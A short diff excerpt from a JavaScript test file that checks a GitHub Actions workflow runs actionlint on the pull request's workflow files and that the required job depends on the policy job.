+  const checksText = await readFile(join(projectRoot, WORKFLOW_DIR, 'checks.yml'), 'utf8');
+  assert.match(checksText, /bash scripts\/actionlint\.sh "\$PR_TREE\/\.github\/workflows"/);
+  const parsed = parseWorkflow(checksText).workflow;
+  assert.ok(parsed.jobs.required.needs.includes('policy'), 'policy is in the aggregate');
+  assert.ok(GATE_COMMANDS['checks.yml'].policy.includes('bash scripts/actionlint.sh "$PR_TREE/.github/workflows"'));
 });
 
 test('pages checks out main, then proves it is the commit Checks validated', async () => {
